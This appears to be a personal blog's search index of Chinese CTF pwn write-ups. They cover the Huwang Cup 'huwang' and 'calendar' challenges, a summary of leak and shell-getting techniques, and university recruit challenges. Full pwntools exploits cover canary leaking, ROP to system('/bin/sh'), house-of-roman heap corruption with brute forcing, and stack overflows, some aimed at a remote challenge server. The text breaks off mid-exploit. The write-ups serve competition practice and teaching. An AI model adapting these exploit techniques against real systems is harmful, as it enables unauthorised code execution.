<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>护网杯pwn复现</title>
      <link href="/2019/02/15/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/02/15/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h1 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表面是个堆题，但实际上是个栈溢出。。。</p><p>给了add delete 函数，但是没有漏洞，题目额外给了一个guess 函数，guess成功会进入secret函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn guess()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST04_4</span><br><span class="line">  __int64 v1; // [rsp+0h] [rbp-80h]</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-80h]</span><br><span class="line">  signed int i; // [rsp+0h] [rbp-80h]</span><br><span class="line">  int v4; // [rsp+4h] [rbp-7Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int rand; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int max_cnt; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  char v8; // [rsp+10h] [rbp-70h]</span><br><span class="line">  char s[32]; // [rsp+20h] [rbp-60h]</span><br><span class="line">  char s1; // [rsp+40h] [rbp-40h]</span><br><span class="line">  char name; // [rsp+60h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v12; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;please input your name&quot;);</span><br><span class="line">  read(0, &amp;name, 0x20uLL);</span><br><span class="line">  memset(s, 0, 0x10uLL);</span><br><span class="line">  puts(&quot;Do you want to guess the secret?&quot;);</span><br><span class="line">  get_str(&amp;v8, 2LL);</span><br><span class="line">  if ( v8 == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( access(&quot;/tmp/secret&quot;, 0) == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      HIDWORD(v1) = open(&quot;/tmp/secret&quot;, 65, 511LL);</span><br><span class="line">      fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">      read(fd, s, 0xCuLL);</span><br><span class="line">      LODWORD(v1) = 0;</span><br><span class="line">      while ( (signed int)v1 &lt;= 11 )</span><br><span class="line">      &#123;</span><br><span class="line">        s[(signed int)v1] &amp;= 1u;</span><br><span class="line">        LODWORD(v1) = v1 + 1;</span><br><span class="line">      &#125;</span><br><span class="line">      write(SHIDWORD(v1), s, 0xCuLL);</span><br><span class="line">      close(SHIDWORD(v1));</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v0 = open(&quot;/tmp/secret&quot;, 0, v1);</span><br><span class="line">    read(v0, s, 0xCuLL);</span><br><span class="line">    close(v0);</span><br><span class="line">    puts(&quot;Input how many rounds do you want to encrypt the secret:&quot;);</span><br><span class="line">    max_cnt = input_0x10();</span><br><span class="line">    if ( max_cnt &gt; 10 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;What? Why do you need to encrypt so many times?&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;At least encrypt one time&quot;, s);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    HIDWORD(v2) = open(&quot;/tmp/secret&quot;, 513);</span><br><span class="line">    LODWORD(v2) = 0;</span><br><span class="line">    while ( (unsigned int)v2 &lt; max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      MD5((__int64)s, 16LL, (__int64)s);</span><br><span class="line">      LODWORD(v2) = v2 + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(SHIDWORD(v2), s, 0x10uLL);</span><br><span class="line">    close(SHIDWORD(v2));</span><br><span class="line">    puts(&quot;Try to guess the md5 of the secret&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    read(0, &amp;s1, 0x10uLL);</span><br><span class="line">    if ( !memcmp(&amp;s1, s, 0x10uLL) )</span><br><span class="line">      secret((__int64)&amp;name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v4 = open(&quot;/tmp/secret&quot;, 513, 511LL, v2);</span><br><span class="line">    rand = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">    read(rand, s, 0xCuLL);</span><br><span class="line">    for ( i = 0; i &lt;= 11; ++i )</span><br><span class="line">      s[i] &amp;= 1u;</span><br><span class="line">    write(v4, s, 0xCuLL);</span><br><span class="line">    close(v4);</span><br><span class="line">    close(rand);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Oh!bye %s\n&quot;, &amp;name);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall secret(__int64 name)</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // ST1B_1</span><br><span class="line">  int v3; // [rsp+1Ch] [rbp-214h]</span><br><span class="line">  char occ; // [rsp+20h] [rbp-210h]</span><br><span class="line">  char s; // [rsp+120h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+228h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Congratulations, %s guessed my secret!\n&quot;, name);</span><br><span class="line">  puts(&quot;And I want to know someting about you, and introduce you to other people who guess the secret!&quot;);</span><br><span class="line">  puts(&quot;What`s your occupation?&quot;);</span><br><span class="line">  get_str(&amp;occ, 0xFFLL);</span><br><span class="line">  v3 = snprintf(</span><br><span class="line">         &amp;s,</span><br><span class="line">         0xFFuLL,</span><br><span class="line">         &quot;I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome.........&quot;</span><br><span class="line">         &quot;.................................................................................................&quot;,</span><br><span class="line">         name,</span><br><span class="line">         &amp;occ);</span><br><span class="line">  puts(&quot;Here is your introduce&quot;);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  puts(&quot;Do you want to edit you introduce by yourself[Y/N]&quot;);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v1 == &apos;Y&apos; )</span><br><span class="line">    read(0, &amp;s, v3 - 1);</span><br><span class="line">  return printf(&quot;The final presentation is as follows:%s\n&quot;, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下保护，除了PIE其他的都开了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>secret函数栈溢出，为了能够进入secret函数，需要绕过guess函数中的检查，这里便是神奇的地方了：</p><p>程序在读入随机数时会先将其清空，而之后输入加密次数时如果输入-1会使程序卡住之后超时退出，在一小段时间之内，本该被加密的文件实际上便是空的。</p><p>而此时如果再次重连程序，md5加密其实便是对0加密，这里大佬又神奇的输入HEX[00000000000000000000000000000000]的md5值并decode(‘hex’)，从而进入secret函数。</p><p>因为进入secret函数内会先输出前面输入的name，这里可以巧妙地顺便将canary输出，有了canary之后的便顺水推舟了。</p><p><em>ps： 但是感觉后面的栈布局有点奇怪，之后再看一看</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line"></span><br><span class="line">def six(name,rd,secret,flag=1):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; \n&apos;)</span><br><span class="line">    sh.sendline(&apos;666&apos;)</span><br><span class="line">    sh.recvuntil(&apos;name\n&apos;)</span><br><span class="line">    sh.send(name)</span><br><span class="line">    sh.recvuntil(&apos;secret?\n&apos;)</span><br><span class="line">    sh.sendline(&apos;y&apos;)</span><br><span class="line">    sh.recvuntil(&apos;secret:\n&apos;)</span><br><span class="line">    sh.sendline(str(rd))</span><br><span class="line">    if flag == 1:</span><br><span class="line">        sh.recvuntil(&apos;secret\n&apos;)</span><br><span class="line">        sh.send(secret)</span><br><span class="line"></span><br><span class="line">six(&apos;aaa&apos;,-1,&apos;bbb&apos;,0)</span><br><span class="line">sh.recvuntil(&apos;timeout~&apos;)</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">six(&apos;a&apos;*0x19,1,&apos;4ae71336e44bf9bf79d2752e234818a5&apos;.decode(&apos;hex&apos;))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;a&apos;*0x19)</span><br><span class="line">canary = u64(&apos;\x00&apos;+sh.recvn(7))</span><br><span class="line">print &apos;canary: &apos;+hex(canary)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)     </span><br><span class="line">sh.send(shellcode)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Congratulations, &apos;)</span><br><span class="line">libc_addr = u64(sh.recvn(6) + &apos;\x00&apos; * 2) - libc.symbols[&apos;puts&apos;]</span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(next(libc.search(&apos;/bin/sh&apos;)) + libc_addr) + p64(libc_addr + libc.symbols[&apos;system&apos;])</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="calendar"><a href="#calendar" class="headerlink" title="calendar"></a>calendar</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>选项题 add edit delete ，但是没有show函数</p><p>add 最多可以控制四个chunk，申请最大size为0x68</p><p>edit 可以输入新的size，只有在新的size小于等于原先输入的size时，可以输入内容</p><p>delete 只有free，存在UAF</p><p>程序在输入字符串时的get_str函数存在off-by-one漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; (signed int)i &lt;= len; ++i )      // off by one</span><br></pre></td></tr></table></figure><p>题目提示house of roman</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>刚开始看到没有show 函数，感觉就有点无从下手，根据house of roman的提示，去看一下这种利用方法，确实是基于没有show功能的情况下的利用方法，拿这个题顺便学习一下。</p><p>查看保护,全开（丧心病狂）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>本地关闭随机化进行调试，调试成功后进行爆破就行了(玄学爆破，getshell要看命)</p><p>house of roman 利用 局部写 减少随机化的程度，从而给出爆破的可能<br>其相当于结合了fastbin attack 与 unsortedbin attack ，在没有泄露函数地址的情况下，利用unsortedbin 的首chunk的fd bk指向main_arena+88，也就是在malloc_hook附近。</p><p><em>ps: 如果是 64 位程序，通过malloc_printerr 触发 malloc ，基本可以稳定 getshell .</em></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./task_calendar&apos;)</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,info):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line">sh.sendafter(&apos;&gt;&apos;,info)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">sh.recvuntil(&apos;input calendar name&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">add(1,0x68)</span><br><span class="line">add(2,0x68)</span><br><span class="line">add(3,0x68)</span><br><span class="line"></span><br><span class="line">#------make chunk2 free to unsorted bin----------</span><br><span class="line"></span><br><span class="line">edit(3,0x68,p64(0)*2+p64(0x90)+p64(0x51)+&apos;\n&apos;)</span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x91&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----fastbin attack-----------------------------</span><br><span class="line"></span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x71&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,1,&apos;\x70\x70&apos;)</span><br><span class="line">edit(2,1,&apos;\xfd\x1a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--fastbin[0x70]= chunk3-&gt; chunk2 -&gt;malloc_hook-13-----</span><br><span class="line">add(1,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">add(3,0x60)</span><br><span class="line"></span><br><span class="line"># fix fastbinY---------</span><br><span class="line">dele(4)</span><br><span class="line">edit(4,7,p64(0))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----unsorted bin attack-------------------------</span><br><span class="line"></span><br><span class="line">add(1,0x60)</span><br><span class="line">edit(1,9,p64(0)+&apos;\x00\x1b&apos;)</span><br><span class="line">add(1,0x60)</span><br><span class="line"></span><br><span class="line">#----edit malloc_hook to one_gadget--------------</span><br><span class="line"></span><br><span class="line">one_off = 0xf66f0</span><br><span class="line">edit(3,5,&apos;aaa\xa4\xd2\xaf&apos;)</span><br><span class="line"></span><br><span class="line">dele(4)</span><br><span class="line">dele(4)</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">sh = process(&apos;./task_calendar&apos;)</span><br><span class="line">try:</span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">except:</span><br><span class="line">print i</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn Heap leak addr &amp;&amp; getshell</title>
      <link href="/2019/02/14/pwn-heap-leak-addr-getshell/"/>
      <url>/2019/02/14/pwn-heap-leak-addr-getshell/</url>
      <content type="html"><![CDATA[<p><em>在堆相关的题中经常需要泄露地址及最后的getshell，总结一下比较常用的方法：</em></p><h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><h2 id="heap-base"><a href="#heap-base" class="headerlink" title="heap base"></a>heap base</h2><ol><li>最常用的即在存在UAF或溢出之类的条件下，因为fastbin 在内存中为单链存放，之后释放的fastbin范围的chunk的fd指针会指向之前释放的等大小范围的chunk，泄露fd指针即可得到heap base</li><li>main arena中存放着top chunk的地址，如果有条件泄露其地址便可以得到heap base</li></ol><h2 id="libc-base"><a href="#libc-base" class="headerlink" title="libc base"></a>libc base</h2><ol><li>unsorted bin为双向链表，而第一个unsorted bin的fd 与 bk指针都指向main_arena+88 处，泄露指针处即可计算得到libc base</li></ol><h2 id="stack-addr"><a href="#stack-addr" class="headerlink" title="stack addr"></a>stack addr</h2><ol><li>一般在可以得到libc base的情况下，可以利用libc中存放的_environ指针，该指针指向栈中环境变量的位置，泄露该指针的值便可以得到栈地址</li></ol><h1 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h1><h2 id="write-to-plt-got"><a href="#write-to-plt-got" class="headerlink" title="write to .plt.got"></a>write to .plt.got</h2><p>当程序保护中got表不满时 即 ： RELRO: Partial RELRO 。此时got表可写，可以将某个函数的got地址改写为system()函数的地址，然后想办法将’/bin/sh’传参进去，get shell</p><h2 id="write-to-malloc-hook-or-free-hook"><a href="#write-to-malloc-hook-or-free-hook" class="headerlink" title="write to malloc_hook or free_hook"></a>write to malloc_hook or free_hook</h2><p>malloc_hook &amp;&amp; free_hook 是程序在调用malloc或free时会首先检查的地方，如果不为空，会先执行其指针指向的地方，所以如果将one_gadget或system(‘/bin/sh’)的地址写向该地址，便可以 get shell</p><h2 id="write-to-stack"><a href="#write-to-stack" class="headerlink" title="write to stack"></a>write to stack</h2><p>一般来说，这个真的是没有办法的话才用，利用上面的方法得到栈地址后，利用漏洞将one_gadget或system(‘/bin/sh’)的地址写向返回地址，这样程序在退出时便会getshell</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>l3c-sec Pwn Recruit New Questions</title>
      <link href="/2019/02/12/l3c-sec-pwn-recruit-new-questions/"/>
      <url>/2019/02/12/l3c-sec-pwn-recruit-new-questions/</url>
      <content type="html"><![CDATA[<p><em>华科一个新战队的招新题，正好最近没有兴致继续下去，来玩一玩招新题</em></p><h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><p>最简单的栈溢出</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./stack&apos;)</span><br><span class="line">sh =remote(&apos;159.65.68.241&apos;,&apos;10003&apos;)</span><br><span class="line">sys_addr = 0x80491e2</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x3a +&apos;bbbb&apos;+p32(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pubg"><a href="#pubg" class="headerlink" title="pubg"></a>pubg</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>先是一大段将随机值写入key.txt然后读出等等，然后将输入的值与读出的值进行比较，相等则进入overflow函数，栈溢出getshell就行。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前面一大段其实是可以不用管的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_401DDC(int time, void *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+10h] [rbp-50h]</span><br><span class="line">  FILE *stream; // [rsp+50h] [rbp-10h]</span><br><span class="line">  unsigned int i; // [rsp+5Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;./key.txt&quot;, &quot;w&quot;);</span><br><span class="line">  for ( i = 0; time + 1 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;s, 0, 0x40uLL);</span><br><span class="line">    sub_401B55((__int64)ptr, (__int64)&amp;s, 0x10u);</span><br><span class="line">    memset(ptr, 0, 0x40uLL);</span><br><span class="line">    strcpy((char *)ptr, &amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  fwrite(ptr, 0x20uLL, 1uLL, stream);           // s --&gt; file</span><br><span class="line">  return fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这一段里可以发现如果输入的time=-1，那么整个写入的循环便会被跳过，随后输入空值便可以进入overflow函数，溢出getshell</p><p>需要注意的是前面需要先写入一次使得key.txt创建，如果文件已经创建的话其实就可以不用了。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#p=process(&apos;./pubg&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,9001)</span><br><span class="line">p.recvuntil(&apos;code&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.sendline(&apos;-2&apos;)</span><br><span class="line">time.sleep(5)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./pubg&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,9001)</span><br><span class="line">p.recvuntil(&apos;code&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.sendline(&apos;-1&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.send(&apos;\x00&apos;*16)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.send(&apos;A&apos;*0x28+p64(0x401BED))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 